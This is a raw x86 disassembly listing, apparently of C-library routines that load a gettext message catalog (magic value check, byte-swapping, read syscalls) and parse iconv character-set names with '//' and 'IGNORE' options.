ror eax, 0x10
ror ax, 8
add eax, ecx
mov ecx, dword [var_8ch]
test edx, edx
mov dword [ecx + 0x18], eax
je 0x8061339
mov ecx, dword [var_84h_2]
mov eax, dword [ecx + 0x10]
ror ax, 8
ror eax, 0x10
ror ax, 8
add eax, ecx
mov ecx, dword [var_8ch]
test edx, edx
mov dword [ecx + 0x1c], eax
je 0x806132b
mov ecx, dword [var_84h_2]
mov eax, dword [ecx + 0x14]
ror ax, 8
ror eax, 0x10
ror ax, 8
mov ecx, dword [var_8ch]
mov dword [ecx + 0x2c], eax
xor ecx, ecx
cmp eax, 2
jbe 0x8060907
test edx, edx
je 0x806131d
mov ecx, dword [var_84h_2]
mov eax, dword [ecx + 0x18]
ror ax, 8
ror eax, 0x10
ror ax, 8
add ecx, eax
mov eax, dword [var_8ch]
test bx, bx
mov dword [eax + 0x30], ecx
mov dword [eax + 0x34], edx
jne 0x806095d
mov dword [eax + 0x20], 0
mov dword [eax + 0x24], 0
mov dword [eax + 0x28], 0
mov ecx, dword [var_7ch]
mov edx, dword [var_8ch]
mov eax, dword [var_78h]
call fcn.08060440
mov edx, dword [var_8ch]
mov ecx, dword [var_8ch]
add edx, 0x44
add ecx, 0x48
call fcn.08062a80
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
test ecx, ecx
je 0x80611af
test edx, edx
je 0x8061309
mov ecx, dword [var_84h_2]
mov ecx, dword [ecx + 0x24]
ror cx, 8
ror ecx, 0x10
ror cx, 8
mov dword [var_94h_2], ecx
mov ebx, dword [var_94h]
test ebx, ebx
je 0x80612e9
test edx, edx
je 0x80612d5
mov eax, dword [var_84h_2]
mov eax, dword [eax + 0x1c]
ror ax, 8
ror eax, 0x10
ror ax, 8
mov dword [var_98h_2], eax
test edx, edx
je 0x80612c7
mov ebx, dword [var_84h_2]
mov eax, dword [ebx + 0x20]
ror ax, 8
ror eax, 0x10
ror ax, 8
add ebx, eax
mov edx, dword [var_98h]
mov dword [var_bch], 0
lea eax, [edx*4 + 0x10]
sub esp, eax
lea ecx, [var_27h]
and ecx, 0xfffffff0
cmp dword [var_bch], edx
mov dword [var_c4h], ecx
jae 0x8060a9a
test esi, esi
je 0x80612b2
mov edx, dword [var_bch_2]
mov eax, dword [ebx + edx*8 + 4]
mov edx, dword [var_84h_2]
ror ax, 8
ror eax, 0x10
ror ax, 8
add edx, eax
test esi, esi
je 0x80612a4
mov ecx, dword [var_bch_2]
mov eax, dword [ebx + ecx*8]
ror ax, 8
ror eax, 0x10
ror ax, 8
test eax, eax
je 0x80611af
cmp byte [eax + edx - 1], 0
jne 0x80611af
mov dword [esp], edx
call fcn.08060100
mov ecx, dword [var_c4h_2]
mov edx, dword [var_bch_2]
mov dword [ecx + edx*4], eax
mov eax, dword [var_98h_2]
inc edx
mov dword [var_bch_2], edx
cmp edx, eax
jae 0x8060a91
mov eax, dword [var_8ch_2]
mov esi, dword [eax + 0xc]
jmp 0x8060a07
mov edx, dword [var_8ch_2]
mov esi, dword [edx + 0xc]
test esi, esi
je 0x8061290
mov ecx, dword [var_84h_2]
mov eax, dword [ecx + 0x28]
ror ax, 8
ror eax, 0x10
ror ax, 8
add eax, ecx
mov dword [var_9ch_2], eax
test esi, esi
je 0x806127c
mov edx, dword [var_84h_2]
mov eax, dword [edx + 0x2c]
ror ax, 8
ror eax, 0x10
ror ax, 8
add eax, edx
mov dword [var_a0h_2], eax
mov ebx, dword [var_8ch]
mov dword [var_a4h], 0
mov dword [var_bch], 0
mov eax, dword [ebx + 0x2c]
shl eax, 2
mov dword [var_a8h], eax
mov eax, dword [var_94h]
cmp dword [var_a4h], eax
jae 0x8060c34
mov dword [var_c8h], 1
mov dword [var_c0h], 0
test esi, esi
je 0x806123e
mov ecx, dword [var_c0h]
test ecx, ecx
jne 0x806122a
mov edx, dword [var_bch_2]
mov ecx, dword [var_9ch_2]
mov eax, dword [ecx + edx*4]
ror ax, 8
ror eax, 0x10
ror ax, 8
add eax, dword [var_84h_2]
xor edi, edi
lea ebx, [eax + 4]
test esi, esi
je 0x8061221
mov eax, dword [ebx + 4]
ror ax, 8
ror eax, 0x10
ror ax, 8
inc eax
je 0x8060be6
test esi, esi
je 0x806121a
mov eax, dword [ebx]
ror ax, 8
ror eax, 0x10
ror ax, 8
add edi, eax
test esi, esi
je 0x8061212
mov eax, dword [ebx + 4]
ror ax, 8
ror eax, 0x10
ror ax, 8
cmp eax, 0xffffffff
je 0x8060be6
cmp eax, dword [var_98h_2]
jae 0x80611af
mov edx, dword [var_c4h_2]
mov eax, dword [edx + eax*4]
test eax, eax
je 0x8060bdc
mov dword [esp], eax
add ebx, 8
call fcn.08053400
add edi, eax
jmp 0x8060b82
mov dword [var_c8h], 0
mov eax, dword [var_c8h]
mov ecx, dword [var_c0h]
test eax, eax
mov dword [ebp + ecx*4 - 0x74], edi
je 0x8060c1c
inc ecx
cmp ecx, 1
mov dword [var_c0h], ecx
jbe 0x8060b2e
mov eax, dword [var_70h]
inc dword [var_a4h_2]
add eax, dword [var_74h]
add dword [var_a8h_2], eax
inc dword [var_bch_2]
mov ebx, dword [var_94h_2]
cmp dword [var_bch_2], ebx
jb 0x8060b1a
mov eax, dword [var_a4h]
shl eax, 4
add dword [var_a8h], eax
mov eax, dword [var_a4h]
test eax, eax
jne 0x8060c6d
mov ecx, dword [var_8ch_2]
mov dword [ecx + 0x20], 0
mov dword [ecx + 0x24], 0
mov dword [ecx + 0x28], 0
jmp 0x806092d
mov eax, dword [var_a8h]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov dword [var_ach], eax
je 0x80611af
mov edx, dword [var_8ch]
mov ecx, eax
mov dword [var_b0h], eax
mov ebx, ecx
mov dword [var_bch], 0
mov dword [var_cch], 0
mov ecx, dword [var_94h]
mov dword [edx + 0x10], eax
mov eax, dword [var_a4h]
shl eax, 3
add ebx, eax
add eax, ebx
mov dword [var_b4h], ebx
cmp dword [var_bch], ecx
mov dword [var_b8h], eax
mov eax, dword [edx + 0x2c]
mov edx, dword [var_b8h]
lea eax, [edx + eax*4]
mov dword [var_ach], eax
jae 0x8060f21
mov ebx, dword [var_8ch_2]
mov ecx, 1
mov dword [var_c0h], 0
mov esi, dword [ebx + 0xc]
test esi, esi
je 0x8061177
mov eax, dword [var_c0h]
test eax, eax
jne 0x8061166
mov edx, dword [var_bch_2]
mov ebx, dword [var_9ch_2]
mov eax, dword [ebx + edx*4]
ror ax, 8
ror eax, 0x10
ror ax, 8
add eax, dword [var_84h_2]
test esi, esi
lea edx, [eax + 4]
je 0x806115d
mov eax, dword [edx + 4]
ror ax, 8
ror eax, 0x10
ror ax, 8
inc eax
je 0x8060d86
test esi, esi
je 0x8061155
mov eax, dword [edx + 4]
ror ax, 8
ror eax, 0x10
ror ax, 8
cmp eax, 0xffffffff
je 0x8060d86
mov ebx, dword [var_c4h_2]
mov eax, dword [ebx + eax*4]
test eax, eax
je 0x8060d84
add edx, 8
jmp 0x8060d57
xor ecx, ecx
test ecx, ecx
je 0x8060f09
inc dword [var_c0h]
cmp dword [var_c0h], 1
jbe 0x8060d05
mov dword [var_c0h], 0
test esi, esi
je 0x8061117
mov eax, dword [var_c0h]
test eax, eax
jne 0x8061103
mov edx, dword [var_bch_2]
mov ecx, dword [var_9ch_2]
mov eax, dword [ecx + edx*4]
mov edx, dword [var_84h_2]
ror ax, 8
ror eax, 0x10
ror ax, 8
add edx, eax
test esi, esi
je 0x80610f0
mov eax, dword [edx]
ror ax, 8
ror eax, 0x10
ror ax, 8
add eax, dword [var_84h_2]
mov dword [var_d0h], eax
mov eax, dword [var_cch_2]
lea edi, [edx + 4]
mov ebx, dword [var_c0h]
mov edx, dword [var_b0h_2]
shl eax, 3
add edx, eax
add eax, dword [var_b4h_2]
test ebx, ebx
cmove eax, edx
test esi, esi
mov dword [var_d4h], eax
je 0x80610e7
mov eax, dword [edi + 4]
ror ax, 8
ror eax, 0x10
ror ax, 8
inc eax
je 0x80610bc
mov edx, dword [ebp - 0xac]
mov eax, dword [ebp - 0xd4]
mov dword [eax + 4], edx
nop
lea esi, [esi]
test esi, esi
je 0x80610b5
mov ebx, dword [edi]
ror bx, 8
ror ebx, 0x10
ror bx, 8
test esi, esi
je 0x80610ad
mov esi, dword [edi + 4]
ror si, 8
ror esi, 0x10
ror si, 8
test ebx, ebx
jne 0x8061080
cmp esi, 0xffffffff
je 0x8060ed5
mov edx, dword [ebp - 0xc4]
add edi, 8
mov ebx, dword [edx + esi*4]
mov dword [esp], ebx
call fcn.08053400
mov ecx, dword [ebp - 0xac]
mov dword [esp + 4], ebx
mov esi, eax
mov dword [esp + 8], eax
mov dword [esp], ecx
call fcn.08053770
mov ebx, dword [ebp - 0x8c]
add dword [ebp - 0xac], esi
mov esi, dword [ebx + 0xc]
jmp 0x8060e60
mov edx, dword [ebp - 0xd4]
mov eax, dword [ebp - 0xac]
sub eax, dword [edx + 4]
mov dword [edx], eax
inc dword [ebp - 0xc0]
cmp dword [ebp - 0xc0], 1
ja 0x8060f03
mov eax, dword [ebp - 0x8c]
mov esi, dword [eax + 0xc]
jmp 0x8060dab
inc dword [ebp - 0xcc]
inc dword [var_bch_2]
mov ecx, dword [var_94h_2]
cmp dword [var_bch_2], ecx
jb 0x8060ced
mov ebx, dword [var_a4h]
cmp dword [var_cch], ebx
jne 0x8061478
mov edx, dword [var_8ch_2]
xor eax, eax
mov dword [var_bch_2], 0
cmp eax, dword [edx + 0x2c]
jae 0x8060f93
mov edx, dword [edx + 0x30]
mov ebx, dword [var_8ch_2]
mov ecx, dword [ebx + 0x34]
test ecx, ecx
je 0x8061071
mov ecx, dword [var_bch_2]
mov eax, dword [edx + ecx*4]
ror ax, 8
ror eax, 0x10
ror ax, 8
mov ecx, dword [var_bch_2]
mov ebx, dword [var_b8h_2]
mov dword [ebx + ecx*4], eax
mov eax, dword [var_8ch_2]
inc ecx
mov dword [var_bch_2], ecx
cmp ecx, dword [eax + 0x2c]
jb 0x8060f4d
mov dword [var_bch_2], 0
mov edx, dword [var_a4h_2]
cmp dword [var_bch_2], edx
jb 0x8060fe1
mov eax, dword [var_8ch_2]
mov edx, dword [var_a4h_2]
mov ecx, dword [var_b0h_2]
mov ebx, dword [var_b4h_2]
mov dword [eax + 0x20], edx
mov dword [eax + 0x34], 0
mov edx, dword [var_b8h_2]
mov dword [eax + 0x24], ecx
mov dword [eax + 0x28], ebx
mov dword [eax + 0x30], edx
jmp 0x806092d
mov ecx, dword [var_bch_2]
mov ebx, dword [var_b0h_2]
mov eax, dword [ebx + ecx*8 + 4]
mov dword [esp], eax
call fcn.08062bb0
xor edx, edx
mov esi, eax
mov eax, dword [var_8ch_2]
mov edi, dword [eax + 0x2c]
mov eax, esi
div edi
mov eax, esi
mov ebx, edx
lea edx, [edi - 2]
mov ecx, edx
xor edx, edx
div ecx
lea esi, [edx + 1]
mov eax, dword [var_b8h_2]
mov edx, dword [eax + ebx*4]
test edx, edx
je 0x806103b
mov eax, edi
mov ecx, ebx
lea edx, [esi + ebx]
sub eax, esi
sub ecx, eax
cmp ebx, eax
mov ebx, ecx
cmovb ebx, edx
jmp 0x806101a
mov edx, dword [var_8ch_2]
mov eax, dword [var_bch_2]
mov ecx, dword [var_b8h_2]
inc dword [var_bch_2]
add eax, dword [edx + 0x14]
inc eax
mov dword [ecx + ebx*4], eax
mov ebx, dword [var_a4h_2]
cmp dword [var_bch_2], ebx
jb 0x8060fe1
jmp 0x8060fab
mov ebx, dword [var_bch_2]
mov eax, dword [edx + ebx*4]
jmp 0x8060f72
nop
mov ecx, dword [ebp - 0xd0]
mov eax, dword [ebp - 0xac]
mov dword [esp + 8], ebx
mov dword [esp + 4], ecx
mov dword [esp], eax
call fcn.08053770
add dword [ebp - 0xac], ebx
add dword [ebp - 0xd0], ebx
jmp 0x8060e93
mov esi, dword [edi + 4]
jmp 0x8060e8b
mov ebx, dword [edi]
jmp 0x8060e75
test esi, esi
je 0x80610e3
mov eax, dword [edi]
ror ax, 8
ror eax, 0x10
ror ax, 8
mov ecx, dword [ebp - 0xd4]
mov ebx, dword [ebp - 0xd0]
mov dword [ecx], eax
mov dword [ecx + 4], ebx
jmp 0x8060ee6
mov eax, dword [edi]
jmp 0x80610cd
cmp dword [edi + 4], 0xffffffff
jmp 0x8060e46
mov ebx, dword [var_84h_2]
add ebx, dword [edx]
mov dword [var_d0h], ebx
jmp 0x8060e04
mov ebx, dword [var_bch_2]
mov edx, dword [var_a0h_2]
mov eax, dword [edx + ebx*4]
jmp 0x8060dd0
mov edi, dword [var_c0h]
test edi, edi
jne 0x806113b
mov ecx, dword [var_bch_2]
mov ebx, dword [var_9ch_2]
mov edx, dword [var_84h_2]
add edx, dword [ebx + ecx*4]
jmp 0x8060de3
mov eax, dword [var_bch_2]
mov ecx, dword [var_a0h_2]
mov edx, dword [var_84h_2]
add edx, dword [ecx + eax*4]
jmp 0x8060de3
mov eax, dword [edx + 4]
jmp 0x8060d6d
cmp dword [edx + 4], 0xffffffff
jmp 0x8060d55
mov edx, dword [var_bch_2]
mov ebx, dword [var_a0h_2]
jmp 0x8060d27
mov eax, dword [var_c0h]
test eax, eax
jne 0x806119b
mov eax, dword [var_84h_2]
mov edx, dword [var_bch_2]
mov ebx, dword [var_9ch_2]
add eax, dword [ebx + edx*4]
jmp 0x8060d3b
mov eax, dword [var_84h_2]
mov edx, dword [var_bch_2]
mov ebx, dword [var_a0h_2]
jmp 0x8061193
mov edx, dword [var_8ch]
mov eax, dword [edx + 0x10]
test eax, eax
jne 0x8061208
mov eax, dword [var_88h]
test eax, eax
je 0x80611f8
mov ecx, dword [var_80h]
mov ebx, dword [var_84h]
mov dword [var_4h], ecx
mov dword [esp], ebx
call fcn.08054780
mov edx, dword [var_8ch]
mov dword [esp], edx
call fcn.08051180
mov ecx, dword [var_78h]
mov dword [ecx + 8], 0
jmp 0x8060955
mov eax, dword [var_84h]
mov dword [esp], eax
call fcn.08051180
jmp 0x80611db
mov dword [esp], eax
call fcn.08051180
jmp 0x80611bc
mov eax, dword [ebx + 4]
jmp 0x8060baf
add edi, dword [ebx]
jmp 0x8060b99
cmp dword [ebx + 4], 0xffffffff
jmp 0x8060b80
mov ebx, dword [var_bch_2]
mov edx, dword [var_a0h_2]
mov eax, dword [edx + ebx*4]
jmp 0x8060b53
mov edx, dword [var_c0h]
test edx, edx
jne 0x8061262
mov ecx, dword [var_bch_2]
mov ebx, dword [var_9ch_2]
mov eax, dword [var_84h_2]
add eax, dword [ebx + ecx*4]
jmp 0x8060b64
mov edx, dword [var_bch_2]
mov ecx, dword [var_a0h_2]
mov eax, dword [var_84h_2]
add eax, dword [ecx + edx*4]
jmp 0x8060b64
mov ecx, dword [var_84h]
add ecx, dword [ecx + 0x2c]
mov dword [var_a0h], ecx
jmp 0x8060ae2
mov ebx, dword [var_84h]
add ebx, dword [ebx + 0x28]
mov dword [var_9ch], ebx
jmp 0x8060abe
mov ecx, dword [var_bch_2]
mov eax, dword [ebx + ecx*8]
jmp 0x8060a48
mov ecx, dword [var_bch_2]
mov edx, dword [var_84h_2]
add edx, dword [ebx + ecx*8 + 4]
jmp 0x8060a2c
mov ebx, dword [var_84h]
add ebx, dword [ebx + 0x20]
jmp 0x80609d5
mov ecx, dword [var_84h]
mov ecx, dword [ecx + 0x1c]
mov dword [var_98h], ecx
jmp 0x80609b7
mov ebx, dword [var_8ch]
mov dword [ebx + 0x20], 0
mov dword [ebx + 0x24], 0
mov dword [ebx + 0x28], 0
jmp 0x806092d
mov ebx, dword [var_84h]
mov ebx, dword [ebx + 0x24]
mov dword [var_94h], ebx
jmp 0x8060987
mov ecx, dword [var_84h_2]
add ecx, dword [ecx + 0x18]
jmp 0x8060907
mov ecx, dword [var_84h]
mov eax, dword [ecx + 0x14]
jmp 0x80608d9
mov eax, dword [var_84h]
add eax, dword [eax + 0x10]
jmp 0x80608b4
mov eax, dword [var_84h]
add eax, dword [eax + 0xc]
jmp 0x806088d
mov ecx, dword [var_84h]
mov eax, dword [ecx + 8]
jmp 0x8060866
mov eax, dword [var_84h]
mov ebx, dword [eax + 4]
jmp 0x8060831
cmp eax, 0xde120495
je 0x80607cd
mov esi, dword [var_88h_2]
test esi, esi
je 0x806139a
mov ecx, dword [var_80h_2]
mov dword [esp], edx
mov dword [var_4h], ecx
call fcn.08054780
jmp 0x8060955
mov ebx, dword [var_84h_2]
mov dword [esp], ebx
call fcn.08051180
jmp 0x8060955
mov eax, dword [var_80h]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov dword [var_84h], eax
je 0x8060955
mov esi, dword [var_80h]
mov dword [var_90h], eax
mov ebx, edi
mov ecx, dword [var_90h]
mov edx, esi
mov eax, 3
int 0x80
cmp eax, 0xfffff000
mov dword [var_d8h], eax
ja 0x8061438
mov eax, dword [var_d8h]
test eax, eax
jle 0x8061417
mov eax, dword [var_d8h_2]
add dword [var_90h_2], eax
sub esi, eax
test esi, esi
jne 0x80613cf
mov ebx, edi
mov eax, 6
int 0x80
jmp 0x80607ba
cmp dword [var_d8h], 0xffffffff
jne 0x806142a
call fcn.08048b20
cmp dword [eax], 4
je 0x8061405
mov ebx, edi
mov eax, 6
int 0x80
jmp 0x8060955
call fcn.08048b20
neg dword [var_d8h]
mov edx, dword [var_d8h]
mov dword [var_d8h], 0xffffffff
mov dword [eax], edx
jmp 0x80613ed
mov ebx, edi
mov eax, 6
int 0x80
jmp 0x8060955
neg edi
call fcn.08048b20
mov dword [eax], edi
mov edi, 0xffffffff
jmp 0x806071a
call fcn.08062c50
nop
nop
nop
push ebp
mov eax, 0
mov ebp, esp
sub esp, 4
test eax, eax
je 0x8084926
mov dword [esp], 3
call section.
mov edx, eax
mov eax, dword [arg_8h]
mov eax, dword [edx + eax*4 + 0x40]
leave
ret
mov edx, dword [0x80a9ab4]
jmp 0x808491d
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x50
mov dword [var_3ch], 0
mov dword [var_38h], 0
mov dword [var_20h], eax
mov dword [var_24h], edx
mov dword [var_28h], ecx
mov dword [var_2ch], 0
mov dword [var_30h], 0
mov dword [var_4h], 0x2f
mov dword [esp], eax
call fcn.08076ce0
test eax, eax
je 0x8083826
lea eax, [eax + 1]
mov dword [var_4h], 0x2f
mov dword [esp], eax
call fcn.08076ce0
test eax, eax
mov ebx, eax
je 0x8083826
inc ebx
cmp byte [eax + 1], 0
jne 0x8083c59
mov eax, dword [var_24h]
mov dword [var_4h], 0x2f
mov dword [esp], eax
call fcn.08076ce0
test eax, eax
je 0x808385f
inc eax
mov dword [var_4h], 0x2f
mov dword [esp], eax
call fcn.08076ce0
test eax, eax
je 0x808385f
cmp byte [eax + 1], 0
lea edx, [eax + 1]
jne 0x8083c26
mov eax, dword [var_20h]
cmp byte [eax], 0x2f
jne 0x80838c4
cmp byte [eax + 1], 0x2f
jne 0x80838c4
cmp byte [eax + 2], 0
jne 0x80838c4
mov eax, 0
test eax, eax
je 0x8083c1c
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov ebx, dword [eax + 0x5c]
mov dword [esp], ebx
call fcn.08053400
lea edx, [eax + 0x15]
and edx, 0xfffffffc
sub esp, edx
lea edx, [var_1bh]
mov dword [var_8h_2], eax
mov dword [var_4h], ebx
and edx, 0xfffffff0
mov dword [var_20h], edx
mov dword [esp], edx
call fcn.08053740
mov word [eax], 0x2f2f
mov byte [eax + 2], 0
mov ecx, dword [var_24h]
cmp byte [ecx], 0x2f
jne 0x8083929
cmp byte [ecx + 1], 0x2f
jne 0x8083929
cmp byte [ecx + 2], 0
jne 0x8083929
mov eax, 0
test eax, eax
je 0x8083c12
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov ebx, dword [eax + 0x5c]
mov dword [esp], ebx
call fcn.08053400
lea edx, [eax + 0x15]
and edx, 0xfffffffc
sub esp, edx
lea edx, [var_1bh]
mov dword [var_8h_2], eax
mov dword [var_4h], ebx
and edx, 0xfffffff0
mov dword [var_24h], edx
mov dword [esp], edx
call fcn.08053740
mov word [eax], 0x2f2f
mov byte [eax + 2], 0
mov eax, dword [arg_8h]
mov edx, dword [var_24h]
lea ecx, [var_18h]
mov dword [var_4h], eax
lea eax, [var_14h]
mov dword [esp], eax
mov eax, dword [var_20h]
call fcn.08056f50
sub esp, 8
mov dword [var_34h], eax
test eax, eax
jne 0x8083b29
mov edi, dword [var_3ch]
xor ebx, ebx
test edi, edi
je 0x8083975
nop
lea esi, [esi]
mov eax, dword [edi]
test eax, eax
jne 0x8083be4
mov eax, dword [edi + 4]
mov ebx, edi
test eax, eax
mov edi, eax
jne 0x8083960
mov eax, dword [var_14h]
lea eax, [eax + eax*8]
lea eax, [eax*4 + 8]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov dword [var_2ch], eax
je 0x8083b49
mov eax, dword [var_18h]
mov ecx, dword [var_2ch]
cld
mov dword [ecx + 4], eax
mov eax, dword [var_2ch]
mov ecx, dword [var_14h]
mov dword [eax], ecx
mov edi, eax
lea ecx, [ecx + ecx*8]
shl ecx, 2
add edi, 8
xor eax, eax
shr ecx, 2
rep stosd dword es:[edi], eax
mov dword [var_30h], 0
mov edx, dword [var_14h]
cmp eax, edx
jae 0x8083a99
mov ecx, dword [var_2ch]
mov dword [var_50h], 0
mov dword [var_4ch], ecx
mov eax, dword [var_4ch]
mov edi, dword [var_3ch]
mov ecx, dword [var_4ch]
add eax, 0x20
test edi, edi
mov dword [ecx + 0x1c], eax
je 0x8083a39
mov dword [var_44h], ecx
mov esi, esi
xor ebx, ebx
cmp ebx, dword [edi + 0xc]
jae 0x8083a2f
mov esi, dword [var_50h]
lea esi, [esi]
mov dword [var_8h], 0x80a99c0
mov eax, dword [edi + 8]
mov eax, dword [eax + ebx*4]
mov dword [var_4h_2], eax
mov eax, dword [var_18h]
mov eax, dword [eax + esi + 0xc]
mov dword [esp], eax
call fcn.0808dcc0
test eax, eax
je 0x8083b67
inc ebx
cmp ebx, dword [edi + 0xc]
jb 0x8083a00
mov edi, dword [edi + 4]
test edi, edi
jne 0x80839f0
mov edx, dword [var_14h]
lea eax, [edx - 1]
cmp dword [var_30h], eax
jae 0x8083b55
mov ecx, dword [var_38h]
mov edx, dword [var_4ch]
mov eax, dword [var_18h]
mov dword [edx + 0x10], ecx
mov edx, dword [var_50h]
mov eax, dword [eax + edx + 0x30]
mov ebx, eax
shl ebx, 8
sub ebx, eax
shl ebx, 5
mov dword [esp], ebx
call fcn.08050fe0
mov ecx, dword [var_4ch]
test eax, eax
mov dword [ecx + 8], eax
je 0x8083b49
mov ecx, dword [var_4ch]
add eax, ebx
inc dword [var_30h]
add dword [var_50h], 0x3c
mov edx, dword [var_14h]
mov dword [ecx + 0xc], eax
add ecx, 0x24
cmp dword [var_30h], edx
mov dword [var_4ch], ecx
jb 0x80839d8
mov ecx, dword [var_34h]
test ecx, ecx
je 0x8083b29
call fcn.08048b20
mov edx, dword [var_2ch]
mov eax, dword [eax]
test edx, edx
mov dword [var_48h], eax
je 0x8083b14
mov eax, dword [var_30h]
dec dword [var_30h]
test eax, eax
je 0x8083b02
mov edx, dword [var_30h]
mov ecx, dword [var_2ch]
lea eax, [edx + edx*8]
lea esi, [ecx + eax*4 + 8]
mov edi, dword [esi + 0x20]
test edi, edi
je 0x8083aeb
mov ebx, edi
mov edi, dword [edi + 0x10]
mov eax, dword [ebx + 8]
test eax, eax
jne 0x8083b3e
mov dword [esp], ebx
call fcn.08051180
test edi, edi
jne 0x8083ad3
mov eax, dword [esi]
mov ebx, dword [var_30h]
sub esi, 0x24
mov dword [esp], eax
call fcn.08051180
dec dword [var_30h]
test ebx, ebx
jne 0x8083acc
mov eax, dword [var_2ch]
mov dword [esp], eax
call fcn.08051180
mov dword [var_2ch], 0
mov edx, dword [var_14h]
mov eax, dword [var_18h]
call fcn.08057110
call fcn.08048b20
mov edx, dword [var_48h]
mov dword [eax], edx
mov eax, dword [var_2ch]
mov ecx, dword [var_28h]
mov dword [ecx], eax
mov eax, dword [var_34h]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret 4
mov eax, dword [ebx + 0xc]
mov dword [esp], eax
call dword [ebx + 8]
jmp 0x8083adf
mov dword [var_34h], 3
jmp 0x8083aa4
or dword [var_38h], 1
mov eax, dword [var_4ch]
mov edx, dword [var_38h]
mov dword [eax + 0x10], edx
jmp 0x8083a99
mov eax, dword [edi + 0x18]
mov dword [var_1ch], 0
test eax, eax
je 0x8083b91
mov eax, dword [var_18h]
mov eax, dword [eax + esi + 0x10]
mov dword [var_4h_2], eax
lea eax, [var_1ch]
mov dword [esp], eax
call dword [edi + 0x18]
test eax, eax
jne 0x8083a2f
mov dword [esp], 0x14
call fcn.08050fe0
test eax, eax
mov ecx, eax
je 0x8083b49
mov eax, dword [edi + 0x10]
mov dword [ecx + 0x10], 0
mov edx, dword [var_44h]
mov dword [ecx], eax
add edx, 0x28
mov eax, dword [edi + 0x14]
mov dword [ecx + 4], eax
mov eax, dword [edi + 0x1c]
mov dword [ecx + 8], eax
mov eax, dword [var_1ch]
mov dword [ecx + 0xc], eax
mov eax, dword [var_44h]
mov esi, dword [eax + 0x28]
test esi, esi
je 0x8083bdd
mov eax, dword [edx]
mov ebx, dword [eax + 0x10]
lea edx, [eax + 0x10]
test ebx, ebx
jne 0x8083bd1
mov dword [edx], ecx
jmp 0x8083a2f
mov eax, edi
call fcn.080846b0
test eax, eax
je 0x808396a
test ebx, ebx
je 0x8083c05
mov eax, dword [edi + 4]
mov dword [ebx + 4], eax
mov eax, dword [edi + 4]
jmp 0x808396f
mov edi, dword [edi + 4]
mov eax, edi
mov dword [var_3ch], edi
jmp 0x808396f
mov eax, dword [0x80a9ab4]
jmp 0x80838f1
mov eax, dword [0x80a9ab4]
jmp 0x808388c
mov eax, edx
sub eax, dword [var_24h]
lea edx, [eax + 0x13]
and edx, 0xfffffffc
sub esp, edx
lea edx, [var_1bh]
and edx, 0xfffffff0
mov byte [eax + edx], 0
mov dword [esp], edx
mov ecx, dword [var_24h]
mov dword [var_8h_2], eax
mov dword [var_4h], ecx
call fcn.08053770
mov dword [var_24h], eax
jmp 0x808385f
mov edx, ebx
sub edx, dword [var_20h]
lea eax, [edx + 0x13]
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1bh]
and eax, 0xfffffff0
mov byte [edx + eax], 0
mov dword [esp], eax
mov dword [var_8h_2], edx
mov edx, dword [var_20h]
mov dword [var_4h], edx
call fcn.08053770
mov dword [esp], ebx
mov dword [var_20h], eax
call fcn.08053400
lea edx, [eax + 1]
add eax, 0x13
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1bh]
mov dword [var_8h_2], edx
mov dword [var_4h], ebx
and eax, 0xfffffff0
mov dword [esp], eax
call fcn.08053770
test eax, eax
mov edx, eax
cmove edx, dword [var_10h]
movzx eax, byte [edx]
cmp al, 0x2c
je 0x8083e55
xor ecx, ecx
test al, al
je 0x8083ce9
mov eax, edx
inc edx
mov ecx, eax
movzx eax, byte [edx]
test al, al
je 0x8083ce6
inc edx
cmp al, 0x2c
je 0x8083e4c
movzx eax, byte [edx]
test al, al
jne 0x8083cd6
mov dword [var_10h], edx
test ecx, ecx
mov esi, ecx
je 0x8083826
mov dword [var_8h_2], 0x80a99c0
mov dword [var_4h], 0x8092de3
mov dword [esp], esi
call fcn.0808dcc0
test eax, eax
jne 0x8083dbe
mov eax, dword [var_3ch]
xor ebx, ebx
test eax, eax
je 0x8083d36
lea esi, [esi]
cmp dword [eax + 0x10], 0x8084100
je 0x8083db5
mov ebx, eax
mov eax, dword [eax + 4]
test eax, eax
jne 0x8083d20
sub esp, 0x30
mov ecx, 8
lea edx, [var_1bh_2]
and edx, 0xfffffff0
test ebx, ebx
cld
mov edi, edx
rep stosd dword es:[edi], eax
mov dword [edx + 8], 0x80a9c24
mov dword [edx + 0xc], 1
mov dword [edx + 0x10], 0x8084100
je 0x8083db0
mov dword [ebx + 4], edx
mov edx, dword [var_10h]
movzx eax, byte [edx]
cmp al, 0x2c
je 0x8083da6
xor ecx, ecx
test al, al
je 0x8083d91
mov eax, edx
inc edx
mov ecx, eax
movzx eax, byte [edx]
test al, al
je 0x8083d8e
inc edx
cmp al, 0x2c
je 0x8083da0
movzx eax, byte [edx]
test al, al
jne 0x8083d82
mov dword [var_10h], edx
test ecx, ecx
mov esi, ecx
jne 0x8083cf3
jmp 0x8083826
mov byte [edx - 1], 0
jmp 0x8083d8e
inc edx
movzx eax, byte [edx]
cmp al, 0x2c
je 0x8083da6
jmp 0x8083d70
mov dword [var_3ch], edx
jmp 0x8083d66
test eax, eax
jne 0x8083d66
jmp 0x8083d36
mov dword [var_8h_2], 0x80a99c0
mov dword [var_4h], str.IGNORE
mov dword [esp], esi
call fcn.0808dcc0
test eax, eax
jne 0x8083de0
or dword [var_38h], 2
jmp 0x8083d66
mov ebx, dword [var_3ch]
mov dword [var_40h], 0
test ebx, ebx
je 0x8083dfe
mov eax, dword [ebx]
test eax, eax
jne 0x8083e28
mov dword [var_40h], ebx
mov ebx, dword [ebx + 4]
test ebx, ebx
jne 0x8083dee
sub esp, 0x30
mov eax, ebx
mov ecx, 8
lea edx, [var_1bh_2]
and edx, 0xfffffff0
cld
mov edi, edx
rep stosd dword es:[edi], eax
mov dword [edx], esi
mov eax, dword [var_40h]
test eax, eax
je 0x8083db0
mov ecx, dword [var_40h]
mov dword [ecx + 4], edx
jmp 0x8083d66
mov dword [var_8h_2], 0x80a99c0
mov eax, dword [ebx]
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.0808dcc0
test eax, eax
jne 0x8083df4
test ebx, ebx
jne 0x8083d66
jmp 0x8083dfe
mov byte [edx - 1], 0
